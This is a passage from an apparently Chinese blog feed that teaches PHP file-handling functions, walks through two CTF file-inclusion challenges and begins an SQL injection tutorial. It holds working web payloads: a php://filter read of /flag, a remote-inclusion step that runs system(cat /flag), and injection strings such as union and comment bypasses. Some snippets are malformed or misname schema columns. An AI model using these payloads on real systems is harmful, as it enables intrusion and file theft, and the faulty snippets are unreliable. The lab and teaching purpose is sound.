class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是使用require的时候，就会直接报错然后跳出函数。</p><h2 id="include-once和require-once函数"><a href="#include-once和require-once函数" class="headerlink" title="include_once和require_once函数"></a>include_once和require_once函数</h2><p>​<code>include_once</code> (<code>require_once</code>)语句在脚本执行期间包含并运行指定文件。此行为和 <code>include (require)</code>语句类似，区别是如果该文件中的代码已经被包含了，则不会再次包含，只会包含一次。include_once(require_once)需要查询一遍已加载的文件列表, 确认是否存在, 然后再加载。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这种情况下1.php被包含两次。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;1.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这种情况下，第二次包含时，是不会进行包含的。</p><h2 id="highlight-file-和show-source"><a href="#highlight-file-和show-source" class="headerlink" title="highlight_file()和show_source()"></a>highlight_file()和show_source()</h2><p>两个函数的用法相同，因为show_source()是highlight_file()的别名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(filename,<span class="keyword">return</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(filename,<span class="keyword">return</span>);</span><br></pre></td></tr></table></figure><p>其中return是可选项</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>filename</td><td>必需。要进行高亮处理的 PHP 文件的路径。</td></tr><tr><td>return</td><td>可选。如果设置 true，则本函数返回高亮处理的代码，而不是输出它们。</td></tr></tbody></table><p>​<br>​</p><h2 id="readfile和file-get-contents和file"><a href="#readfile和file-get-contents和file" class="headerlink" title="readfile和file_get_contents和file"></a>readfile和file_get_contents和file</h2><p>三者区别：</p><table><thead><tr><th align="center">名称</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">file</td><td align="center">把整个文件读入一个数组中</td></tr><tr><td align="center">readfile</td><td align="center">读入一个文件并写入到输出缓冲。</td></tr><tr><td align="center">file_get_contents</td><td align="center">将整个文件读入一个字符串</td></tr></tbody></table><p>注：以下提到的<strong>PHP 的内置路径（include_path）</strong>为在<code>php.ini</code>的php配置文件中进行设置的搜索路径。</p><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a><strong>file_get_contents</strong></h3><p>file_get_contents() 把整个文件读入一个字符串中。<br>该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>(path,include_path,context,start,max_length)</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>path</td><td>必需。规定要读取的文件。</td></tr><tr><td>include_path</td><td>可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果您还想在 include_path(在 php.ini 中)中搜索文件的话，请设置该参数为 ‘1’。</td></tr><tr><td>context</td><td>可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。</td></tr><tr><td>start</td><td>可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。</td></tr><tr><td>max_length</td><td>可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。</td></tr></tbody></table><h3 id="readfile"><a href="#readfile" class="headerlink" title="readfile"></a><strong>readfile</strong></h3><p>readfile() 函数读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(filename,include_path,context)</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>filename</td><td>必需。规定要读取的文件。</td></tr><tr><td>include_path</td><td>可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果您还想在 include_path(在 php.ini 中)中搜索文件的话，请设置该参数为 ‘1’。</td></tr><tr><td>context</td><td>可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。</td></tr></tbody></table><h3 id="file-1"><a href="#file-1" class="headerlink" title="file"></a><strong>file</strong></h3><p>与 file_get_contents() 类似，不同的是 file() 将文件读取后作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file</span>(path,include_path,context)</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>path</td><td>必需。规定要读取的文件</td></tr><tr><td>include_path</td><td>可选。只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）中搜索文件。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”</td></tr><tr><td>context</td><td>可选。规定文件句柄的环境（即执行的条件）。context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td></tr></tbody></table><h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents"></a>file_put_contents</h2><p><code>file_put_contents()</code> 函数把一个字符串写入文件中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">file_put_contents</span> ( <span class="keyword">string</span> <span class="variable">$filename</span> , <span class="keyword">mixed</span> <span class="variable">$data</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, resource <span class="variable">$context</span> ]] )</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">filename</td><td align="left">必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件</td></tr><tr><td align="center">data</td><td align="left">必需。规定要写入文件的数据。可以是字符串、数组或数据流</td></tr><tr><td align="center">flag</td><td align="left">可选。规定如何打开&#x2F;写入文件。可能的值：<br /> FILE_USE_INCLUDE_PATH ：只提供了文件名，而没有提供完整的文件路径，将在PHP 的内置路径（include_path）搜索文件。<br />FILE_APPEND：如果设置了该标志，数据将被追加到文件末尾而不是覆盖文件内容。<br /> LOCK_EX：如果设置了该标志，在写入文件时会获取一个独占锁定（排它锁），以防止其他进程同时写入文件。这可以确保在多个进程同时写入文件时不会发生冲突。</td></tr><tr><td align="center">context</td><td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td></tr></tbody></table><p>该函数访问文件时，遵循以下<strong>顺序</strong>：</p><ol><li>如果设置了 <code>FILE_USE_INCLUDE_PATH</code> 标志，函数将首先检查 <code>filename</code> 参数的副本是否存在于 PHP 的内置路径（include_path）中。</li><li>函数将打开文件以进行写入操作。</li><li>如果设置了 <code>LOCK_EX</code> 标志，函数将对文件进行锁定（获取独占锁定），以确保在写入文件时不会发生冲突。</li><li>如果设置了 <code>FILE_APPEND</code> 标志，函数将将写入的数据追加到文件末尾。否则，函数将清除文件的内容并写入新的数据。</li><li>函数将写入数据到文件中。</li><li>函数将关闭文件并释放对文件的所有锁定。</li></ol><p>​<br>​</p><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>fopen() 函数打开一个文件或 URL。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">fopen</span>(filename,mode,include_path,context)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">filename</td><td align="left">必需。规定要打开的文件或 URL。</td></tr><tr><td align="left">mode</td><td align="left">必需。规定您请求到该文件&#x2F;流的访问类型。可能的值：”r” （只读方式打开，将文件指针指向文件头）”r+” （读写方式打开，将文件指针指向文件头）”w” （写入方式打开，清除文件内容，如果文件不存在则尝试创建之）”w+” （读写方式打开，清除文件内容，如果文件不存在则尝试创建之）”a” （写入方式打开，将文件指针指向文件末尾进行写入，如果文件不存在则尝试创建之）”a+” （读写方式打开，通过将文件指针指向文件末尾进行写入来保存文件内容）”x” （创建一个新的文件并以写入方式打开，如果文件已存在则返回 FALSE 和一个错误）”x+” （创建一个新的文件并以读写方式打开，如果文件已存在则返回 FALSE 和一个错误）</td></tr><tr><td align="left">include_path</td><td align="left">可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。</td></tr><tr><td align="left">context</td><td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td></tr></tbody></table><h1 id="文章引用"><a href="#文章引用" class="headerlink" title="文章引用"></a><strong>文章引用</strong></h1><ul><li><p>引用<strong>PHP 手册</strong>的内容<br>原文链接：<a href="https://www.php.net/manual/zh/filters.php">PHP: 可用过滤器列表 - Manual</a></p></li><li><p>引用<strong>菜鸟教程</strong>的文章<br>原文链接：<a href="https://www.runoob.com/php/func-filesystem-fopen.html">https://www.runoob.com/php/func-filesystem-fopen.html</a></p></li><li><p>引用<strong>CSDN博主「Landasika」的原创文章</strong>，遵循CC 4.0 BY-SA版权协议<br>原文链接：<a href="https://blog.csdn.net/Jeff_12138/article/details/124815370">https://blog.csdn.net/Jeff_12138/article/details/124815370</a></p></li><li><p>引用<strong>CSDN博主「w0s1np」的原创文章</strong>，遵循CC 4.0 BY-SA版权协议</p><p>原文链接：<a href="https://blog.csdn.net/woshilnp/article/details/117266628">https://blog.csdn.net/woshilnp/article/details/117266628</a></p></li></ul><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a><strong>实战</strong></h1><h2 id="No-1-土豆哥给的题目"><a href="#No-1-土豆哥给的题目" class="headerlink" title="No.1 土豆哥给的题目"></a><strong>No.1 土豆哥给的题目</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;easy lfi, but no flag~~&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&quot;first one:&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>土豆哥：flag一般在根目录下</strong><del>(根本没听到,做了很多无用功，但偶然接触到了一句话木马)</del></p><p><strong>题解：</strong> </p><p>​<code>$cmd = preg_replace(&quot;/flag/i&quot;, &#39;&#39;, $cmd);</code>这个正则表达式用于删除cmd中含有<code>flag</code>地方，第二个  <code>if (preg_match(&quot;/flag/i&quot;, $cmd))</code>用来判断是否含有flag这个词如果有则进行if下的内容。</p><p>​按题目的含义我们可以构造出<code>flflagag</code>这个作为flag的替代</p><p>​尝试直接进行<code>cmd=/flflagag</code>进行传参，发现并没有出现参数，判读估计进行了隐藏。使用php中的<strong>php:&#x2F;&#x2F;filter</strong>伪协议进行读取，使用<code>cmd=php://filter/read=convert.base64-encode/resource=/flag</code>尝试使用base64加密后读取。</p><p>​页面出现经过base64加密后的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKJEZMQUcgPSAiUk9JU3tkb3Vkb3VibGVibGVfY21jbWRkX3dpd2lubn0iOw==</span><br></pre></td></tr></table></figure><p>解密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="string">&quot;ROIS&#123;doudoubleble_cmcmdd_wiwinn&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>发现flag是个变量无法直接通过include包含直接读出。</p><h2 id="No-2-CTFHub-技能树-RCE-文件包含-远程包含"><a href="#No-2-CTFHub-技能树-RCE-文件包含-远程包含" class="headerlink" title="No.2 CTFHub 技能树-RCE-文件包含-远程包含"></a><strong>No.2 CTFHub 技能树-RCE-文件包含-远程包含</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i don<span class="string">&#x27;t have shell, how to get flag?&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><strong>页面给了个小提示</strong></p><p><strong>phpinfo</strong></p><table><thead><tr><th>Directive</th><th>Local Value</th><th>Master Value</th></tr></thead><tbody><tr><td>allow_url_fopen</td><td>On</td><td>On</td></tr><tr><td>allow_url_include</td><td>On</td><td>On</td></tr></tbody></table><p><strong>题解：</strong></p><p>查看题目</p><p>​<code> if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;))</code>发现题目要求必须使用非含flag的文件进行包含，则此时可以考虑进行远程包含。在服务器上建立一个txt文件，里面写入能进行打印出根目录下flag的代码，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(cat /flag;); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后成功获取代码</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常见协议与封装协议&quot;&gt;&lt;a href=&quot;#常见协议与封装协议&quot; class=&quot;headerlink&quot; title=&quot;常见协议与封装协议&quot;&gt;&lt;/a&gt;&lt;strong&gt;常见协议与封装协议&lt;/strong&gt;&lt;/h1&gt;&lt;figure class=&quot;highlight php</summary>
      
    
    
    
    <category term="CTF" scheme="https://we11s.github.io/categories/CTF/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-PHP" scheme="https://we11s.github.io/tags/Web-PHP/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入-基础</title>
    <link href="https://we11s.github.io/posts/3000552397/"/>
    <id>https://we11s.github.io/posts/3000552397/</id>
    <published>2023-11-01T16:05:19.000Z</published>
    <updated>2024-02-25T08:54:40.755Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a><strong>SQL注入流程</strong></h2><ol><li>找到注入点：判断是否有漏洞，寻找插入位置</li><li>构造注入语句，并在注入点注入形成新的SQL语句</li><li>新形成的SQL语句提交数据库处理</li><li>数据库执行新的SQL语句，引发注入攻击</li></ol><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a><strong>前置知识</strong></h2><p><strong>1.特别的数据库</strong></p><p>在MySQL 5.0版本之后，MySQL默认在数据库中存放一个<code>information_schema</code>的数据库，在该库中，需要记住三个表名，分别是：<code>schemata</code>、<code>tables</code>、<code>columns</code>。</p><ol><li><p><code>schemata</code>表存储该用户创建的所有数据库的库名。</p><p>   &gt;&gt;&gt;&gt;其中记录<strong>数据库库名的字段名为</strong>：<code>schema_name</code>。</p></li><li><p><code>tables</code>表存储该用户创建的所有数据库的库名和表名。</p><p>  &gt;&gt;&gt;&gt;其中记录<strong>数据库库名</strong>和<strong>表名的字段名分别是</strong>：<code>tables_schema</code>和<code>table_name</code>。</p></li><li><p><code>columns</code>表存储该用户创建的所有数据库的库名、表名和字段名。</p><p>  &gt;&gt;&gt;&gt;其中记录<strong>数据库库名、表名和字段名的字段名分别是</strong>：<code>tables_schema</code>、<code>table_name</code>和<code>column_name</code>。</p></li></ol><p><strong>2.注释符</strong></p><p>  在MySQL中，常见注释符的表达方式：</p><p>​   <strong><code>#</code> ……</strong> ：<code>#</code>号后面的都会被注释</p><p>​   <strong><code>--</code> ……</strong> ：<code>--</code>号后面的都会被注释，不过在 <code>--</code> 的前后都<strong>需要加空格</strong>再加数据(GET传参时只能使用<code>--</code>，后的<strong>空格用<code>+</code>代替</strong>)</p><p>​   <strong><code>/* ... */</code></strong> ：在查询语句中使用斜杠星号注释，从 &#x2F; 开始到 *&#x2F; 结束的部分都被视为注释，不会被执行。</p><hr><ul><li>但**<code>/* ... */</code>** 的特殊用法-<strong>-条件注释</strong></li></ul><p>条件注释是一种特殊的注释语法，它允许在<strong>注释中使用关键字</strong>，而这些关键字在执行查询时会被<strong>解析为相应的操作</strong>。</p><p>语法格式为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!&lt;conditional_keyword&gt; &lt;query_part&gt; */</span></span><br></pre></td></tr></table></figure><p>   例如：<code>index?id=-10 /*!union*/ /*!select*/ 1,2,3</code>等同于<code>index?id=-10 union select 1,2,3</code></p><h2 id="SQL注入常用基础语句"><a href="#SQL注入常用基础语句" class="headerlink" title="SQL注入常用基础语句"></a><strong>SQL注入常用基础语句</strong></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> version(); #查看数据库版本 </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>(); #查看数据库用户</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> database(); #查看当前库名;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() ; #查看当前库下的表名</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() ; </span><br><span class="line">#只回显一行数据下查看当前库下的全部表名</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;xxx&#x27;</span>; </span><br><span class="line">#查询列名<span class="operator">-</span>把xxx缓存前面查询到的表名</span><br></pre></td></tr></table></figure><h2 id="SQL注入常用函数"><a href="#SQL注入常用函数" class="headerlink" title="SQL注入常用函数"></a><strong>SQL注入常用函数</strong></h2><h3 id="联合查询-union-注入使用"><a href="#联合查询-union-注入使用" class="headerlink" title="联合查询(union)注入使用"></a>联合查询(<code>union</code>)注入使用</h3><p><strong>1.</strong><code>concat()</code>函数</p><p>​<code>concat()</code>函数：将多个<strong>不同字段</strong>的字符串连接成一个字符串。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(str1，str2) #语法</span><br></pre></td></tr></table></figure><p>注意：返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p><p><strong>2.</strong><code>group_concat()</code>函数</p><p>​<code>group_concat()</code> 将多个<strong>同个字段</strong>的字符串连接成一个字符串。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat( [<span class="keyword">distinct</span>] 要连接的字段 [<span class="keyword">order</span> <span class="keyword">by</span> 排序字段 <span class="keyword">asc</span><span class="operator">/</span><span class="keyword">desc</span>] [separator ‘分隔符’]) #语法</span><br></pre></td></tr></table></figure><h3 id="报错注入使用"><a href="#报错注入使用" class="headerlink" title="报错注入使用"></a>报错注入使用</h3><p><strong>1.</strong><code>extractvalue()</code>函数</p><p>​<em>从 MySQL 5.7.8 版本开始，<code>ExtractValue()</code> 函数已被弃用</em></p><p>​<code>ExtractValue()</code> 函数来提取 XML 字符串中的特定路径的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExtractValue(xml_string, xpath_expression)</span><br></pre></td></tr></table></figure><ul><li>xml_frag：xml文档对象的名称，是一个string类型。</li><li>xpath_expr：使用xpath语法格式的路径。</li></ul><p><strong>2.</strong><code>updataxml()</code>函数</p><ul><li>xml_target：xml文档对象的名称，是一个string类型。</li><li>xpath_expr：使用xpath语法格式的路径。</li><li>new_xml：需要更新的内容。</li></ul><p><strong>3.</strong><code>count()+rand()+floor()+group by()</code>函数</p><p><code>rand()</code>函数：rand()返回0到1的随机数。rand(0)返回一个固定的0到1的伪随机数。</p><p><code>floor()</code>函数：<code>floor(x)</code>返回小于或等于 x 的最大整数。</p><p><code>group by</code>语句：<code>group by</code>语句可以根据一个或多个列对结果集进行分组，在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。</p><h3 id="布尔盲注使用"><a href="#布尔盲注使用" class="headerlink" title="布尔盲注使用"></a>布尔盲注使用</h3><p><strong>1.</strong><code>substr()/substring()</code>函数</p><p>​<code>substr()/substring()</code>函数：用来截取数据库某个字段中的一部分。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(string，<span class="keyword">start</span>开始位置，length截取长度)  #语法</span><br></pre></td></tr></table></figure><p>参数</p><ul><li>string：必选，数据库中需要截取的字段</li><li>start：必选。正数，从字符串指定位置开始截取；负数，从字符串结尾指定位置开始   截取；0，在字符串中第一个位置开始截取。</li><li>length：可选，需要截取的长度。缺省。即截取到结束位置</li></ul><p><strong>2.</strong><code>ascii()</code>函数</p><p>​<code>ascii()</code>函数：返回字符串str的最左边的数值。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(str)  #语法</span><br></pre></td></tr></table></figure><p><strong>2.</strong><code>length()</code> 函数，返回字符串的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(str) #语法</span><br></pre></td></tr></table></figure><h2 id="注入点分类"><a href="#注入点分类" class="headerlink" title="注入点分类"></a><strong>注入点分类</strong></h2><h3 id="①数字型注入点"><a href="#①数字型注入点" class="headerlink" title="①数字型注入点"></a><strong>①数字型注入点</strong></h3><p><strong>类似的后端语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p> 在 Web 端大概是 <code>http://xxx.com/index.php?id=1</code> 这种形式，其<strong>注入点 id 类型为数字</strong>，所以叫数字型注入点。</p><p>用<code>1 and 1=1</code>进行组合出来的sql注入语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where id=1 and 1=1</span><br></pre></td></tr></table></figure><h3 id="②字符型注入点"><a href="#②字符型注入点" class="headerlink" title="②字符型注入点"></a>②字符型注入点</h3><p><strong>类似的后端语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p> 在 Web 端大概是 <code>http://xxx.com/index.php?id=admin</code> 这种形式，其<strong>注入点id 类型为字符类型</strong>，所以叫字符型注入点。</p><p>使用<code>id=1&#39; and 1=1 --+</code>组合出来的sql注入语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+&#x27; LIMIT 0,1&quot;;</span></span><br></pre></td></tr></table></figure><p> <strong>注意多了一个引号</strong>。由于注入拼接语句后多了一个<code>&#39;</code>,<strong>需要用注释符进行消除对语句的影响</strong></p><h3 id="③搜索型注入点"><a href="#③搜索型注入点" class="headerlink" title="③搜索型注入点"></a>③搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword&#x3D;关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 字段 <span class="keyword">like</span> <span class="string">&#x27;%关键字%&#x27;</span>`。</span><br><span class="line"></span><br><span class="line">组合出来的<span class="keyword">sql</span>注入语句为：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> 